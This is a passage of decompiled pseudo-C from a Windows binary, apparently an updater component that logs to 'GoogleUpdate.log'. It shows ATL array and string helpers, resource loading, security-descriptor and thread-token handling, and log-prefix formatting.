  FUN_004044af((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void FUN_00404532(void)

{
  return;
}



// Library Function - Single Match
//  private: bool __thiscall ATL::CAtlArray<void *,class ATL::CElementTraits<void
// *>>::GrowBuffer(unsigned int)
// 
// Library: Visual Studio 2015 Release

bool __thiscall
ATL::CAtlArray<void*,class_ATL::CElementTraits<void*>_>::GrowBuffer
          (CAtlArray_void__class_ATL__CElementTraits_void____ *this,unsigned_int param_1)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  void *pvVar4;
  uint uVar5;
  uint uVar6;
  
  uVar1 = *(uint *)(this + 8);
  if (uVar1 < param_1) {
    if (*(int *)this == 0) {
      uVar6 = *(uint *)(this + 0xc);
      if (*(uint *)(this + 0xc) <= param_1) {
        uVar6 = param_1;
      }
      iVar3 = FUN_00423449();
      *(int *)this = iVar3;
      if (iVar3 != 0) {
LAB_004045b1:
        *(uint *)(this + 8) = uVar6;
        goto LAB_004045b4;
      }
    }
    else {
      uVar5 = *(uint *)(this + 0xc);
      if (*(uint *)(this + 0xc) == 0) {
        uVar5 = uVar1 >> 1;
        if (uVar1 >> 1 < param_1 - uVar1) {
          uVar5 = param_1 - uVar1;
        }
      }
      uVar6 = uVar1 + uVar5;
      if (uVar1 + uVar5 <= param_1) {
        uVar6 = param_1;
      }
      pvVar4 = (void *)FUN_00423449();
      if (pvVar4 != (void *)0x0) {
        Checked::memmove_s(pvVar4,*(int *)(this + 4) << 2,*(void **)this,*(int *)(this + 4) << 2);
        FID_conflict__free(*(void **)this);
        *(void **)this = pvVar4;
        goto LAB_004045b1;
      }
    }
    bVar2 = false;
  }
  else {
LAB_004045b4:
    bVar2 = true;
  }
  return bVar2;
}



void __fastcall FUN_004045bd(int param_1)

{
  if (*(int *)(param_1 + 0x10) != 0) {
    FUN_004049bc(*(int *)(param_1 + 0x10),*(uint *)(param_1 + 0x14));
    FID_conflict__free(*(void **)(param_1 + 0x10));
    *(undefined4 *)(param_1 + 0x10) = 0;
  }
  *(undefined4 *)(param_1 + 0x14) = 0;
  *(undefined4 *)(param_1 + 0x18) = 0;
  FID_conflict__free(*(void **)(param_1 + 4));
  *(undefined4 *)(param_1 + 4) = 0;
  return;
}



// Library Function - Single Match
//  void __cdecl ATL::Checked::memmove_s(void *,unsigned int,void const *,unsigned int)
// 
// Library: Visual Studio 2015 Release

void __cdecl
ATL::Checked::memmove_s(void *param_1,unsigned_int param_2,void *param_3,unsigned_int param_4)

{
  errno_t eVar1;
  
  eVar1 = _memmove_s(param_1,param_2,param_3,param_4);
  AtlCrtErrorCheck(eVar1);
  return;
}



void __thiscall FUN_00404612(void *this,uint param_1)

{
  uint uVar1;
  uint uVar2;
  code *pcVar3;
  unsigned_int uVar4;
  int iVar5;
  
  uVar1 = param_1 + 1;
  if (((param_1 <= uVar1) && (uVar1 != 0)) && (uVar2 = *(uint *)((int)this + 0x14), uVar1 <= uVar2))
  {
    FUN_004049bc(*(int *)((int)this + 0x10) + param_1 * 4,1);
    iVar5 = uVar2 - uVar1;
    if (iVar5 != 0) {
      uVar4 = iVar5 * 4;
      ATL::Checked::memmove_s
                ((void *)(param_1 * 4 + *(int *)((int)this + 0x10)),uVar4,
                 (void *)(*(int *)((int)this + 0x10) + uVar1 * 4),uVar4);
    }
    *(int *)((int)this + 0x14) = *(int *)((int)this + 0x14) + -1;
    return;
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar3 = (code *)swi(3);
  (*pcVar3)();
  return;
}



undefined4 __thiscall FUN_00404677(void *this,uint param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_004046c0((void *)((int)this + 0x10),param_1);
  return *puVar1;
}



int * __thiscall FUN_0040468b(void *this,int *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  
                    // WARNING: Load size is inaccurate
  puVar1 = *this;
  if (puVar1 == (undefined4 *)*param_1) {
    if ((int *)this != param_1) {
      *param_1 = 0;
    }
  }
  else {
    if (puVar1 != (undefined4 *)0x0) {
      (**(code **)*puVar1)(1);
    }
    *(undefined4 *)this = 0;
    iVar2 = *param_1;
    *param_1 = 0;
    *(int *)this = iVar2;
  }
  return (int *)this;
}



int __thiscall FUN_004046c0(void *this,uint param_1)

{
  code *pcVar1;
  int iVar2;
  
  if (param_1 < *(uint *)((int)this + 4)) {
                    // WARNING: Load size is inaccurate
    return *this + param_1 * 4;
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  iVar2 = (*pcVar1)();
  return iVar2;
}



void __fastcall FUN_004046df(int param_1)

{
  uint uVar1;
  byte bVar2;
  char cVar3;
  uint uVar4;
  int **ppiVar5;
  int *piVar6;
  void *pvVar7;
  int *piVar8;
  uint uVar9;
  uint uVar10;
  uint local_18;
  int *local_10;
  void *local_c;
  uint uStack8;
  
  piVar8 = (int *)0x0;
  uVar1 = *(uint *)(param_1 + 0x14);
  uVar10 = 1;
  local_10 = (int *)0x0;
  uVar4 = 4;
  if (4 < uVar1) {
    do {
      uVar10 = uVar4;
      uVar4 = uVar10 * 3 + 1;
    } while (uVar4 < uVar1);
    if (uVar10 == 0) {
      return;
    }
  }
  do {
    uVar4 = uVar10 - 1;
    if (uVar4 < uVar1) {
      local_c = (void *)(param_1 + 0x10);
      local_18 = uVar4 - uVar10;
      do {
        piVar8 = (int *)FUN_004046c0(local_c,uVar4);
        FUN_0040468b(&local_10,piVar8);
        piVar8 = local_10;
        uVar9 = local_18;
        for (uStack8 = uVar4; uVar10 <= uStack8; uStack8 = uStack8 - uVar10) {
          ppiVar5 = (int **)FUN_004046c0(local_c,uVar9);
          piVar6 = *ppiVar5;
          bVar2 = *(byte *)(piVar6 + 0x1a) >> 4 & 1;
          if ((bVar2 == 0) || ((*(byte *)(piVar8 + 0x1a) & 0x10) != 0)) {
            if ((bVar2 == 0) && ((*(byte *)(piVar8 + 0x1a) & 0x10) != 0)) break;
            if (*(char *)(piVar6 + 0x1c) == '\0') {
code_r0x0040478a:
              if (*(char *)(piVar8 + 0x1c) != '\0') break;
            }
            else {
              if (*(char *)(piVar8 + 0x1c) == '\0') goto code_r0x004047a4;
              if (*(char *)(piVar6 + 0x1c) == '\0') goto code_r0x0040478a;
            }
            cVar3 = (**(code **)(*piVar6 + 0x10))();
            if ((cVar3 == '\0') || (cVar3 = (**(code **)(*piVar8 + 0x10))(), cVar3 != '\0')) {
              cVar3 = (**(code **)(*piVar6 + 0x10))();
              if (cVar3 == '\0') {
                (**(code **)(*piVar8 + 0x10))();
              }
              break;
            }
          }
code_r0x004047a4:
          piVar6 = (int *)FUN_004046c0(local_c,uVar9);
          pvVar7 = (void *)FUN_004046c0(local_c,uStack8);
          FUN_0040468b(pvVar7,piVar6);
          uVar9 = uVar9 - uVar10;
        }
        ppiVar5 = &local_10;
        pvVar7 = (void *)FUN_004046c0(local_c,uStack8);
        FUN_0040468b(pvVar7,(int *)ppiVar5);
        uVar4 = uVar4 + 1;
        local_18 = local_18 + 1;
        piVar8 = local_10;
      } while (uVar4 < uVar1);
    }
    uVar10 = uVar10 / 3;
    if (uVar10 == 0) {
      if (piVar8 != (int *)0x0) {
        (**(code **)*piVar8)(1);
      }
      return;
    }
  } while( true );
}



void FUN_0040473c(void)

{
  return;
}



undefined4 * __thiscall FUN_00404843(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0042f12c;
  FUN_00404997((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



int __fastcall FUN_00404868(int *param_1)

{
  code *pcVar1;
  undefined uVar2;
  size_t _Size;
  uint *puVar3;
  int iVar4;
  int extraout_ECX;
  
  if (param_1[0x1b] == 0) {
    _Size = (**(code **)(*param_1 + 8))();
    puVar3 = (uint *)_malloc(_Size);
    if (puVar3 == (uint *)0x0) {
      ATL::AtlThrowImpl(-0x7ff8fff2);
      pcVar1 = (code *)swi(3);
      iVar4 = (*pcVar1)();
      return iVar4;
    }
    FUN_00416e80(puVar3,0,_Size);
    *(short *)((int)puVar3 + 2) = (short)_Size;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)(param_1 + 0x1a);
    uVar2 = (**(code **)(*param_1 + 0xc))();
    *(undefined *)puVar3 = uVar2;
    puVar3[1] = param_1[0x19];
    GetLengthSid(param_1 + 2);
    iVar4 = FUN_00423348(extraout_ECX);
    ATL::AtlCrtErrorCheck(iVar4);
    param_1[0x1b] = (int)puVar3;
  }
  return param_1[0x1b];
}



undefined4 * __thiscall FUN_00404907(void *this,byte param_1)

{
  FUN_00404997((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void FUN_00404929(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall CCommandLineInfo::`scalar deleting destructor'(unsigned int)
// 
// Library: Visual Studio 2008 Release

void * __thiscall
CCommandLineInfo::_scalar_deleting_destructor_(CCommandLineInfo *this,unsigned_int param_1)

{
  FUN_00404961((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return this;
}



void __fastcall FUN_00404961(undefined4 *param_1)

{
  *param_1 = &PTR__scalar_deleting_destructor__0042f164;
  FUN_00401df0((int **)(param_1[0x17] + -0x10));
  FUN_00401df0((int **)(param_1[0x16] + -0x10));
  FUN_00401df0((int **)(param_1[0x15] + -0x10));
  FUN_00401df0((int **)(param_1[0x14] + -0x10));
  return;
}



void __fastcall FUN_00404997(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042f148;
  if (param_1[0x1b] != 0) {
    FID_conflict__free((void *)param_1[0x1b]);
    param_1[0x1b] = 0;
  }
  FUN_00404961(param_1 + 1);
  return;
}



void __fastcall FUN_004049bc(int param_1,uint param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  
  uVar2 = 0;
  if (param_2 != 0) {
    do {
      puVar1 = *(undefined4 **)(param_1 + uVar2 * 4);
      if (puVar1 != (undefined4 *)0x0) {
        (**(code **)*puVar1)(1);
      }
      *(undefined4 *)(param_1 + uVar2 * 4) = 0;
      uVar2 = uVar2 + 1;
    } while (uVar2 < param_2);
  }
  return;
}



undefined4 * __fastcall FUN_004049e3(undefined4 *param_1)

{
  param_1[3] = 2;
  param_1[1] = 0;
  *(undefined *)(param_1 + 2) = 0;
  *param_1 = &PTR_FUN_0042f114;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  return param_1;
}



undefined4 __fastcall FUN_00404a04(undefined4 param_1)

{
  return param_1;
}



undefined4 * __thiscall FUN_00404a07(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0042f168;
  FUN_00404a5c(this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



uint __thiscall FUN_00404a2c(void *this,PSECURITY_DESCRIPTOR_CONTROL param_1)

{
  if (((param_1 != (PSECURITY_DESCRIPTOR_CONTROL)0x0) &&
      (*param_1 = 0, *(int *)((int)this + 4) != 0)) &&
     (param_1 = (PSECURITY_DESCRIPTOR_CONTROL)
                GetSecurityDescriptorControl
                          (*(PSECURITY_DESCRIPTOR *)((int)this + 4),param_1,(LPDWORD)&param_1),
     param_1 != (PSECURITY_DESCRIPTOR_CONTROL)0x0)) {
    return CONCAT31((int3)((uint)param_1 >> 8),1);
  }
  return (uint)param_1 & 0xffffff00;
}



void __fastcall FUN_00404a5c(void *param_1)

{
  undefined4 uVar1;
  PACL local_20;
  PACL local_1c;
  void *local_18;
  void *local_14;
  int local_10;
  BOOL local_c;
  ushort local_8 [2];
  
  if (*(int *)((int)param_1 + 4) != 0) {
    uVar1 = FUN_00404a2c(param_1,local_8);
    if (((char)uVar1 != '\0') && ((local_8[0] & 0x8000) == 0)) {
      GetSecurityDescriptorOwner(*(PSECURITY_DESCRIPTOR *)((int)param_1 + 4),&local_14,&local_c);
      FID_conflict__free(local_14);
      GetSecurityDescriptorGroup(*(PSECURITY_DESCRIPTOR *)((int)param_1 + 4),&local_18,&local_c);
      FID_conflict__free(local_18);
      GetSecurityDescriptorDacl
                (*(PSECURITY_DESCRIPTOR *)((int)param_1 + 4),&local_10,&local_1c,&local_c);
      if (local_10 != 0) {
        FID_conflict__free(local_1c);
      }
      GetSecurityDescriptorSacl
                (*(PSECURITY_DESCRIPTOR *)((int)param_1 + 4),&local_10,&local_20,&local_c);
      if (local_10 != 0) {
        FID_conflict__free(local_20);
      }
    }
    FID_conflict__free(*(void **)((int)param_1 + 4));
    *(undefined4 *)((int)param_1 + 4) = 0;
  }
  return;
}



HMODULE __fastcall FUN_00404b19(uint param_1)

{
  HINSTANCE__ *hModule;
  HRSRC pHVar1;
  HGLOBAL pvVar2;
  int iVar3;
  
  hModule = ATL::CAtlBaseModule::GetHInstanceAt((CAtlBaseModule *)&DAT_004369a0,0);
  iVar3 = 1;
  if (hModule != (HINSTANCE__ *)0x0) {
    do {
      pHVar1 = FindResourceExW(hModule,(LPCWSTR)0x6,(LPCWSTR)((param_1 >> 4) + 1 & 0xffff),0);
      if ((pHVar1 != (HRSRC)0x0) &&
         (pvVar2 = FUN_00404b83(hModule,pHVar1,param_1), pvVar2 != (HGLOBAL)0x0)) {
        return hModule;
      }
      hModule = ATL::CAtlBaseModule::GetHInstanceAt((CAtlBaseModule *)&DAT_004369a0,iVar3);
      iVar3 = iVar3 + 1;
    } while (hModule != (HINSTANCE__ *)0x0);
  }
  return (HMODULE)0x0;
}



HGLOBAL __fastcall FUN_00404b83(HMODULE param_1,HRSRC param_2,uint param_3)

{
  ushort *puVar1;
  HGLOBAL hResData;
  ushort *puVar2;
  DWORD DVar3;
  uint uVar4;
  
  hResData = LoadResource(param_1,param_2);
  if (hResData != (HGLOBAL)0x0) {
    puVar2 = (ushort *)LockResource(hResData);
    if (puVar2 != (ushort *)0x0) {
      DVar3 = SizeofResource(param_1,param_2);
      puVar1 = (ushort *)((int)puVar2 + DVar3);
      for (uVar4 = param_3 & 0xf; uVar4 != 0; uVar4 = uVar4 - 1) {
        if (puVar1 <= puVar2) goto LAB_00404bcd;
        puVar2 = puVar2 + *puVar2 + 1;
      }
      if (puVar2 < puVar1) {
        return (HGLOBAL)(-(uint)(*puVar2 != 0) & (uint)puVar2);
      }
    }
LAB_00404bcd:
    hResData = (HGLOBAL)0x0;
  }
  return hResData;
}



void __fastcall FUN_00404bdf(HMODULE param_1,uint param_2)

{
  HRSRC pHVar1;
  
  pHVar1 = FindResourceW(param_1,(LPCWSTR)((param_2 >> 4) + 1 & 0xffff),(LPCWSTR)0x6);
  if (pHVar1 != (HRSRC)0x0) {
    FUN_00404b83(param_1,pHVar1,param_2);
  }
  return;
}



// Library Function - Single Match
//  int __cdecl ATL::AtlCrtErrorCheck(int)
// 
// Library: Visual Studio 2012 Release

int __cdecl ATL::AtlCrtErrorCheck(int param_1)

{
  code *pcVar1;
  int iVar2;
  long lVar3;
  
  if (param_1 == 0) {
    return param_1;
  }
  if (param_1 == 0xc) {
    lVar3 = -0x7ff8fff2;
  }
  else if ((param_1 == 0x16) || (param_1 == 0x22)) {
    lVar3 = -0x7ff8ffa9;
  }
  else {
    if (param_1 == 0x50) {
      return param_1;
    }
    lVar3 = -0x7fffbffb;
  }
  AtlThrowImpl(lVar3);
  pcVar1 = (code *)swi(3);
  iVar2 = (*pcVar1)();
  return iVar2;
}



void __fastcall FUN_00404c45(uint param_1,undefined2 param_2,uint param_3,int param_4)

{
  int iVar1;
  
  if ((param_4 == -1) && (param_3 != 0)) {
    FUN_0041c12a(param_1,param_2);
    param_1 = param_3;
  }
  iVar1 = FUN_004233c7(param_1);
  ATL::AtlCrtErrorCheck(iVar1);
  return;
}



HMODULE __thiscall FUN_00404c82(void *this,uint param_1)

{
  ushort uVar1;
  HMODULE pHVar2;
  char *pcVar3;
  
  pHVar2 = FUN_00404b19(param_1);
  if ((pHVar2 != (HMODULE)0x0) &&
     (pHVar2 = (HMODULE)FUN_00404bdf(pHVar2,param_1), pHVar2 != (HMODULE)0x0)) {
    uVar1 = *(ushort *)&pHVar2->unused;
    pcVar3 = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,(uint)uVar1);
    FUN_00404c45((uint)pcVar3,uVar1,(uint)((int)&pHVar2->unused + 2),
                 (uint)*(ushort *)&pHVar2->unused);
    ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)this,(uint)uVar1);
    pHVar2 = (HMODULE)0x1;
  }
  return pHVar2;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall ATL::CStringT<char,class StrTraitMFC<char,class
// ATL::ChTraitsCRT<char>>>::CheckImplicitLoad(void const *)
//  private: bool __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t>>>::CheckImplicitLoad(void const *)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

uint __thiscall CheckImplicitLoad(void *this,HMODULE param_1)

{
  byte bVar1;
  
  bVar1 = 0;
  if ((param_1 != (HMODULE)0x0) && (((uint)param_1 & 0xffff0000) == 0)) {
    param_1 = FUN_00404c82(this,(uint)param_1 & 0xffff);
    bVar1 = 1;
  }
  return (uint)param_1 & 0xffffff00 | (uint)bVar1;
}



void * __thiscall FUN_00404cfa(void *this,HMODULE param_1)

{
  int *piVar1;
  uint uVar2;
  undefined2 extraout_DX;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(this,piVar1);
  uVar2 = CheckImplicitLoad(this,param_1);
  if ((char)uVar2 == '\0') {
    FUN_00404d7b(this,extraout_DX,(int)param_1);
  }
  return this;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall ATL::CSimpleStringT<char,0>::ReleaseBuffer(int)
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::ReleaseBuffer(int)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

void __fastcall ReleaseBuffer(int *param_1,int param_2,int param_3)

{
  if ((param_3 == -1) && (param_3 = *param_1, param_3 != 0)) {
    param_3 = FUN_0041cc9c((byte)param_1,param_2);
  }
  ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)param_1,param_3);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: char * __thiscall ATL::CSimpleStringT<char,0>::GetBufferSetLength(int)
//  public: wchar_t * __thiscall ATL::CSimpleStringT<wchar_t,0>::GetBufferSetLength(int)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

char * __thiscall GetBufferSetLength(void *this,int param_1)

{
  char *pcVar1;
  
  pcVar1 = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,param_1);
  ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)this,param_1);
  return pcVar1;
}



void __fastcall FUN_00404d7b(void *param_1,undefined2 param_2,int param_3)

{
  int iVar1;
  
  if (param_3 == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = FUN_0041c12a(param_1,param_2);
  }
  FUN_00401d64(param_1,param_3,iVar1);
  return;
}



PVOID FUN_00404da4(void)

{
  int iVar1;
  PVOID *ppvVar2;
  _MEMORY_BASIC_INFORMATION local_20;
  
  local_20.BaseAddress = (PVOID)0x0;
  ppvVar2 = &local_20.AllocationBase;
  for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {
    *ppvVar2 = (PVOID)0x0;
    ppvVar2 = ppvVar2 + 1;
  }
  VirtualQuery(&LAB_00404dd2,&local_20,0x1c);
  return local_20.AllocationBase;
}



void FUN_00404dd1(void)

{
  return;
}



int * __fastcall FUN_00404dd7(int *param_1,HMODULE param_2)

{
  uint nSize;
  int *piVar1;
  LPWSTR lpFilename;
  int extraout_EDX;
  DWORD DVar2;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  DVar2 = 0x103;
  do {
    nSize = DVar2 + 1;
    lpFilename = (LPWSTR)ATL::CSimpleStringT<char,0>::PrepareWrite
                                   ((CSimpleStringT_char_0_ *)param_1,nSize);
    DVar2 = GetModuleFileNameW(param_2,lpFilename,nSize);
    ReleaseBuffer(param_1,extraout_EDX,-(uint)(DVar2 < nSize) & DVar2);
  } while (nSize <= DVar2);
  return param_1;
}



undefined4 * __fastcall FUN_00404e28(undefined4 *param_1,HMODULE param_2)

{
  HMODULE *ppHVar1;
  undefined4 *local_8;
  
  local_8 = param_1;
  ppHVar1 = (HMODULE *)FUN_00404dd7((int *)&local_8,param_2);
  FUN_00408710(param_1,ppHVar1);
  FUN_00401df0((int **)(local_8 + -4));
  return param_1;
}



undefined4 * __fastcall FUN_00404e52(undefined4 *param_1,HMODULE param_2)

{
  HMODULE *ppHVar1;
  undefined4 *local_8;
  
  local_8 = param_1;
  ppHVar1 = (HMODULE *)FUN_00404dd7((int *)&local_8,param_2);
  FUN_004086bf(param_1,ppHVar1);
  FUN_00401df0((int **)(local_8 + -4));
  return param_1;
}



undefined4 * __fastcall FUN_00404e7c(undefined4 *param_1,HMODULE param_2)

{
  HMODULE *ppHVar1;
  undefined4 *local_8;
  
  local_8 = param_1;
  ppHVar1 = (HMODULE *)FUN_00404e52(&local_8,param_2);
  FUN_00408761(param_1,ppHVar1);
  FUN_00401df0((int **)(local_8 + -4));
  return param_1;
}



int * __fastcall FUN_00404ea6(int *param_1)

{
  uint nBufferLength;
  int *piVar1;
  LPWSTR lpBuffer;
  int extraout_EDX;
  DWORD DVar2;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  DVar2 = 0x103;
  do {
    nBufferLength = DVar2 + 1;
    lpBuffer = (LPWSTR)ATL::CSimpleStringT<char,0>::PrepareWrite
                                 ((CSimpleStringT_char_0_ *)param_1,nBufferLength);
    DVar2 = GetTempPathW(nBufferLength,lpBuffer);
    ReleaseBuffer(param_1,extraout_EDX,-(uint)(DVar2 < nBufferLength) & DVar2);
  } while (nBufferLength <= DVar2);
  return param_1;
}



undefined8 FUN_00404eea(void)

{
  LPCWSTR *ppWVar1;
  undefined8 uVar2;
  int local_8;
  
  ppWVar1 = (LPCWSTR *)FUN_00404dd7(&local_8,(HMODULE)0x0);
  uVar2 = FUN_00404f1b(ppWVar1);
  FUN_00401df0((int **)(local_8 + -0x10));
  return uVar2;
}



undefined8 __fastcall FUN_00404f1b(LPCWSTR *param_1)

{
  int iVar1;
  undefined8 uVar2;
  void *local_c;
  undefined4 local_8;
  
  local_c = (void *)0x0;
  local_8 = 0;
  iVar1 = FUN_00408984(&local_c,*param_1);
  if (iVar1 == 0) {
    uVar2 = 0;
  }
  else {
    uVar2 = FUN_00408a74(&local_c);
  }
  FID_conflict__free(local_c);
  return uVar2;
}



void * __fastcall FUN_00404f5b(void *param_1,int *param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  
  piVar1 = (int *)FUN_00402bcc(param_2);
  CSimpleStringT__(param_1,piVar1);
  if (param_3 == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_0041c12a(extraout_ECX,extraout_DX);
  }
  FUN_00404f9f(param_1,*(int *)(*param_2 + -0xc),param_3,iVar2);
  return param_1;
}



void __thiscall FUN_00404f9f(void *this,int param_1,undefined4 param_2,int param_3)

{
  int extraout_ECX;
  
  ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,param_3 + param_1);
  FUN_00423348(extraout_ECX);
  FUN_00423348(param_3 * 2);
  ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)this,param_3 + param_1);
  return;
}



bool __thiscall FUN_00404ff2(void *this,DWORD param_1)

{
  HANDLE ThreadHandle;
  BOOL BVar1;
  void *local_8;
  
  local_8 = this;
  ThreadHandle = GetCurrentThread();
  BVar1 = OpenThreadToken(ThreadHandle,param_1,1,&local_8);
  if (BVar1 != 0) {
                    // WARNING: Load size is inaccurate
    (**(code **)(*this + 4))();
    *(void **)((int)this + 4) = local_8;
  }
  return BVar1 != 0;
}



undefined4 * __fastcall FUN_0040502d(undefined4 *param_1,short **param_2)

{
  undefined4 *puVar1;
  int iVar2;
  int **ppiVar3;
  int *piVar4;
  uint uVar5;
  int extraout_ECX;
  uint uVar6;
  undefined4 *local_8;
  
  local_8 = param_1;
  iVar2 = FUN_00407a34(*param_2,0x5c);
  if (iVar2 == -1) {
    ppiVar3 = FUN_00401aca((int **)(extraout_ECX + -0x10));
    *param_1 = ppiVar3 + 4;
  }
  else {
    piVar4 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_8,piVar4);
    uVar6 = 0;
    if (0 < *(int *)(*param_2 + -6)) {
      do {
        uVar5 = FUN_00402998(param_2,uVar6);
        if ((short)uVar5 != 0x5c) {
          uVar5 = FUN_00402998(param_2,uVar6);
          ATL::CSimpleStringT<wchar_t,0>::AppendChar
                    ((CSimpleStringT_wchar_t_0_ *)&local_8,uVar5 & 0xffff);
        }
        uVar6 = uVar6 + 1;
      } while ((int)uVar6 < *(int *)(*param_2 + -6));
    }
    puVar1 = local_8;
    ppiVar3 = FUN_00401aca((int **)(local_8 + -4));
    *param_1 = ppiVar3 + 4;
    FUN_00401df0((int **)(puVar1 + -4));
  }
  return param_1;
}



undefined4 * __fastcall FUN_004050c3(undefined4 *param_1)

{
  HMODULE *ppHVar1;
  HMODULE pHVar2;
  int **ppiVar3;
  undefined6 uVar4;
  int local_10;
  LPCWSTR local_c;
  int local_8;
  
  ppHVar1 = (HMODULE *)FUN_00404e52(&local_10,(HMODULE)0x0);
  FUN_00408761(&local_c,ppHVar1);
  FUN_00401df0((int **)(local_10 + -0x10));
  pHVar2 = (HMODULE)FUN_00404da4();
  FUN_00404e7c(&local_8,pHVar2);
  ppiVar3 = FUN_00401aca((int **)(local_c + -8));
  *param_1 = ppiVar3 + 4;
  uVar4 = FUN_00402858(&local_8,local_c);
  if ((int)uVar4 != 0) {
    FUN_00402d6d(param_1,(short)((uint6)uVar4 >> 0x20),(int)&DAT_0042faa4);
    FUN_004029bc(param_1,local_8,*(int *)(local_8 + -0xc));
  }
  FUN_00401df0((int **)(local_8 + -0x10));
  FUN_00401df0((int **)(local_c + -8));
  return param_1;
}



void FUN_0040514f(void)

{
  return;
}



undefined8 __thiscall FUN_00405150(char param_1,int *param_2)

{
  undefined8 uVar1;
  undefined local_1c [6];
  undefined4 local_16;
  undefined4 local_12;
  WORD local_e;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (param_1 != '\0') {
    local_1c._0_2_ = 0;
    local_1c._2_4_ = 0;
    local_16 = 0;
    local_12 = 0;
    local_e = 0;
    GetLocalTime((LPSYSTEMTIME)local_1c);
    FUN_00402fa2((CSimpleStringT_char_0_ *)param_2,L"[%02d/%02d/%02d %02d:%02d:%02d.%03d]");
  }
  GetCurrentThreadId();
  GetCurrentProcessId();
  FUN_004068c0(param_2,L"[%s][%u:%u]");
  uVar1 = FUN_0041a954();
  return uVar1;
}



void FUN_004051e8(void)

{
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined * FUN_004051e9(void)

{
  int *piVar1;
  int iVar2;
  undefined2 extraout_DX;
  undefined4 *puVar3;
  int local_c;
  int local_8;
  
  _DAT_00437e78 = 0;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&DAT_00437e7c,piVar1);
  FUN_00406a66(&DAT_00437e80);
  _DAT_00437e9c = 0x1010001;
  FUN_00404cfa(&DAT_00437ea0,(HMODULE)L"GoogleUpdate.log");
  _DAT_00437ea4 = 0x101;
  DAT_00437ea6 = 0;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar1);
  FUN_00402781(&local_c,L"SystemDrive");
  iVar2 = local_c;
  if (*(int *)(local_c + -0xc) != 0) {
    FUN_00401b2a(&local_8,&local_c);
    FUN_00402d6d(&local_8,extraout_DX,(int)&DAT_0042f0d4);
  }
  FUN_00404f5b(&DAT_00437eb0,&local_8,(int)L"GoogleUpdate.ini");
  FUN_00401df0((int **)(iVar2 + -0x10));
  FUN_00401df0((int **)(local_8 + -0x10));
  _DAT_00437eb4 = 0;
  _DAT_00437ef4 = 0;
  _DAT_00437ef8 = 0;
  _DAT_00437efc = 0;
  _DAT_00437ea8 = 0;
  _DAT_00437eac = 0;
  puVar3 = &DAT_00437eb8;
  for (iVar2 = 0xf; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  piVar1 = FUN_004050c3(&local_c);
  FUN_00401b2a(&DAT_00437e7c,piVar1);
  FUN_00401df0((int **)(local_c + -0x10));
  DAT_00437b68 = 1;
  FUN_00405401(&DAT_00437e20);
  return &DAT_00437e20;
}



void __fastcall FUN_00405401(undefined *param_1)

{
  LPWSTR *this;
  LPCWSTR lpKeyName;
  uint uVar1;
  LPCWSTR pWVar2;
  LPCWSTR pWVar3;
  UINT UVar4;
  undefined2 extraout_DX;
  int extraout_EDX;
  undefined8 uVar5;
  LPCWSTR local_c;
  LPCWSTR local_8;
  
  FUN_00406049(param_1,(int *)&local_8);
  pWVar3 = local_8;
  if (*(int *)(local_8 + -6) == 0) {
    param_1[0x7c] = 1;
    *(undefined2 *)(param_1 + 0x7e) = 1;
    *(undefined2 *)(param_1 + 0x84) = 0x100;
